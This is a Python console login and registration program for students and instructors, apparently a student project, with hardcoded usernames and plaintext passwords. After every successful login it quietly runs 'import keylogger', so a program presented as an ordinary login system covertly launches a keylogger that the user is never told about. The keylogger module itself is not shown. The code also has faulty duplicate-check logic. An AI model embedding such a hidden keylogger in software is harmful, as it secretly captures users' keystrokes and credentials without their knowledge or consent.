#parent class Student
class Student:
    
    #initializing list students, and student_passwords
    students = []
    student_passwords = []

    #setting up attributes, getting username and password
    def __init__(self, user_name, password):
        self.user_name = user_name
        self.password = password

    #if student username does not exist when creating a username, add sutdent to the list student
    def addStudent(self, user_name):
        for i in students:
            if i != user_name:
                self.students.append(user_name)
                
    #adding student password when creatng new account
    def addStudentPassword(self, password):
        for i in student_passwords:
            if i != password:
                self.student_passwords.append(password)

        
#subclass of parent class Student
class Student_Name(Student):
    #setting up first name and the last name of the student when creating an account
    def __init__(self, user_name, password, first_name, last_name):
        super().__init__(user_name, password)
        self.first_name = first_name
        self.last_name = last_name



#parent class Instructor
class Instructor:

    #initializing list instructors, and instructor_passwords
    instructors = []
    instructor_passwords = []

    #setting up attributes, getting username and password
    def __init__(self, user_name, password):
        self.user_name = user_name
        self.password = password

    #if instructor username does not exist when creating a username, add instructor to the list instructor
    def addInstructor(self, user_name):
        for i in instructors:
            if i != user_name:
                self.instructors.append(user_name)

    #adding student password when creatng new account
    def addInstructorPassword(self, password):
        for i in instructor_passwords:
            if i != password:
                self.instructor_passwords.append(password)


# subclass of parent class Instructor
class Instructor_Name(Instructor):
    def __init__(self, user_name, password, first_name, last_name):
        super().__init__(user_name, password)
        self.first_name = first_name
        self.last_name = last_name
    

#global lists instructors and instructor_passwords    
instructors = []
instructor_passwords = []

#global lists students and student_passwords 
students = []
student_passwords = []

#function checking if the instructor username already exists
def check_existing_instructor(user_name):
    #if instructors list is empty
    if len(instructors) == 0:
        result = False
        return result
    else:
        #loop through instructors list
        for i in instructors:
            #if some element i is the same as username
            if i == user_name:
                result = True
                return result
    return False

#function checking if the instructor password matches instructor username
def instructor_login(user_name, password):
    #index is set equal to the index of the user_name in instructors list
    index = instructors.index(user_name)
    #if instructor_passwords element at index is the same as password
    if instructor_passwords[index] == password:
        #display 'Login Successful'
        print("Login Successful! Welcome ", user_name)
    else:
        #loop while instructor_passwords element at index is not the same as password
        while instructor_passwords[index] != password:
            #prompt user to enter the password again
            password = input("Incorrect Password\nEnter Password: ")
        #display 'Login Successful'
        print("Login Successful! Welcome ", user_name)

#function checking if the student username already exists
def check_existing_student(user_name):
    #if students list is empty
    if len(students) == 0:
        result = False
        return result
    else:
        #loop through students list
        for i in students:
            #if some element i is the same as username
            if i == user_name:
                result = True
                return result
    return False

#function checking if the student password matches student username
def student_login(user_name, password):
    #index is set equal to the index of the user_name in students list
    index = students.index(user_name)
    #if student_passwords element at index is the same as password
    if student_passwords[index] == password:
        #display 'Login Successful'
        print("Login Successful! Welcome ", user_name)
    else:
        #loop while instructor_passwords element at index is not the same as password
        while student_passwords[index] != password:
            #prompt user to enter the password again
            password = input("Incorrect Password\nEnter Password: ")
        #display 'Login Successful'
        print("Login Successful! Welcome ", user_name)

#creating instructor objects      
instructor1 = Instructor_Name("Sen", "Jin123", "Sen", "Jin")
instructor1.addInstructor("Sen")
instructor1.addInstructorPassword("Jin123")
instructors.append("Sen")
instructor_passwords.append("Jin123")

instructor2 = Instructor_Name("Din", "Hen456", "Din", "Jonson")
instructor2.addInstructor("Din")
instructor2.addInstructorPassword("Hen456")
instructors.append("Din")
instructor_passwords.append("Hen456")

instructor3 = Instructor_Name("Donna123", "Hi12478", "Donna", "Lee")
instructor3.addInstructor("Donna123")
instructor3.addInstructorPassword("Hi12478")
instructors.append("Donna123")
instructor_passwords.append("Hi12478")

#creating student objects
student1 = Student_Name("Sam001", "Polly78", "Sam", "Jameson")
student1.addStudent("Sam001")
student1.addStudentPassword("Polly78")
students.append("Sam001")
student_passwords.append("Polly78")

student2 = Student_Name("Tim1", "Ham123", "Tim", "Jonson")
student2.addStudent("Tim1")
student2.addStudentPassword("Ham123")
students.append("Tim1")
student_passwords.append("Ham123")

student3 = Student_Name("Hana456", "bh90210", "Donna", "Lee")
student3.addStudent("Hana456")
student3.addStudentPassword("bh90210")
students.append("Hana456")
student_passwords.append("bh90210")

try:
    #Ask user if they want to login or create an account
    choice = int(input("Select 1 to login or 2 to create new account: "))
    #Assert user entered choice 1 or 2
    assert choice == 1 or choice == 2
except:
    #print 'Invalid Choice' if user does not pick choice 1 or 2
    print("Invalid Choice")
else:
#if user selects choice 1 or 2, execute the statements below
    #if user selects to login
    if choice == 1:
        try:
            #Ask if the user wants to sign in as an instructor or a student
            second_choice = int(input("Select 1 for instructor login. Select 2 for student login: "))
            #Asser user entered second_choice 1 or 2
            assert second_choice == 1 or second_choice == 2
        except:
            #print 'Invalid Choice' if user does not pick choice 1 or 2
            print("Invalid Choice")
        else:
        #if user selects choice 1 or 2, execute the statements below
            #if user selects to login as an instructor
            if second_choice == 1:
                #print statement 'Instructor Login'
                print("\nInstructor Login\n")
                #Ask user to enter a username
                user_name = input("Enter username: ")
                #call the function check_existing_instructor(user_name) to see if the username entered by the user exists
                user_exists = check_existing_instructor(user_name)
                #loop through instructors list items
                for i in instructors:
                    #if the username exists in the instructor list
                    if user_exists == True:
                        #prompt user to input the password
                        password = input("Enter Password: ")
                        #call the function instructor_login(user_name, password), pass in the user entered username and password as parameters
                        #check to see if username and password matches
                        instructor_login(user_name, password)
                        #once logged in, import the module keylogger
                        import keylogger
                        #break statement to get out of the loop
                        break
                    #if the username does not exist in the instructor list
                    else:
                        #prompt user to re-enter username
                        user_name = input("Account does not exist\nEnter username: ")
                        #check if username exists
                        user_exists = check_existing_instructor(user_name)
            #if user selects to login as a student
            elif second_choice == 2:
                #print statement 'InstructorStudent Login'
                print("\nStudent Login\n")
                #Ask user to enter a username
                user_name = input("Enter username: ")
                #call the function check_existing_student(user_name) to see if the username entered by the user exists
                user_exists = check_existing_student(user_name)
                #loop through students list items
                for i in students:
                    #if the username exists in the instructor list
                    if user_exists == True:
                        #prompt user to input the password
                        password = input("Enter Password: ")
                        #call the function student_login(user_name, password), pass in the user entered username and password as parameters
                        #check to see if username and password matches
                        student_login(user_name, password)
                        #once logged in, import the module keylogger
                        import keylogger
                        #break statement to get out of the loop
                        break
                    else:
                        #prompt user to re-enter username
                        user_name = input("Account does not exist\nEnter username: ")
                        #check if username exists
                        user_exists = check_existing_student(user_name)
    #if user selects to create account
    elif choice == 2:
        try:
            #Ask if the user wants to create an account as an instructor or a student
            second_choice = int(input("Select 1 if you are an instructor. Select 2 if you are a student: "))
            #Assert user entered choice 1 or 2
            assert second_choice == 1 or second_choice == 2
        except:
            #print 'Invalid Choice' if user does not pick choice 1 or 2
            print("Invalid Choice")
        else:
        #if user selects choice 1 or 2, execute the statements below
            #if user selects to create an account as an instructor
            if second_choice == 1:
                #print statement 'Welcome Instructor'
                print("\nWelcome Instructor\n")
                #Ask user to enter a username
                user_name = input("Enter username: ")
                #call the function check_existing_instructor(user_name) to see if the username entered by the user exists
                user_exists = check_existing_instructor(user_name)
                #loop through instructors list items
                for i in instructors:
                    #if the username exists in the instructors list
                    if user_exists == True:
                        #Ask user to enter a different username
                        user_name = input("Username already exists. Enter another username: ")
                #Ask user to enter a password
                password = input("Enter password: ")
                #Ask user to enter firstname
                first_name = str(input("Enter Firstname: "))
                #Ask user to enter lastname
                last_name = str(input("Enter Lastname: "))
                #create an object from the Instructor_Name class
                #pass in the user entered user_name, password, first_name, last_name 
                instructor_user1 = Instructor_Name(user_name, password, first_name, last_name)
                #pass in the username entered into the addInstructor method in Instructor class
                instructor_user1.addInstructor(user_name)
                #pass in the password entered into the addInstructorPassword method in Instructor class
                instructor_user1.addInstructorPassword(password)
                #append the user entered username to instructors list
                instructors.append(user_name)
                #append the user entered password to instructor_passwords list
                instructor_passwords.append(password)
                #display 'account created'
                print("Account Created!")
            #if user selects to create an account as a student
            elif second_choice == 2:
                #print statement 'Welcome Student'
                print("\nWelcome Student\n")
                #Ask user to enter a username
                user_name = input("Enter username: ")
                #call the function check_existing_student(user_name) to see if the username entered by the user exists
                user_exists = check_existing_student(user_name)
                #loop through students list items
                for i in students:
                    #if the username exists in the students list
                    if user_exists == True:
                        #Ask user to enter a different username
                        user_name = input("Username already exists. Enter another username: ")
                #Ask user to enter a password
                password = input("Enter password: ")
                #Ask user to enter firstname
                first_name = str(input("Enter Firstname: "))
                #Ask user to enter lastname
                last_name = str(input("Enter Lastname: "))
                #create an object from the Student_Name class
                #pass in the user entered user_name, password, first_name, last_name 
                student_user1 = Student_Name(user_name, password, first_name, last_name)
                #pass in the username entered into the addStudent method in Student class
                student_user1.addStudent(user_name)
                #pass in the password entered into the addStudentPassword method in Student class
                student_user1.addStudentPassword(password)
                #append the user entered username to students list
                students.append(user_name)
                #append the user entered password to student_passwords list
                student_passwords.append(password)
                #display 'account created'
                print("Account Created!")

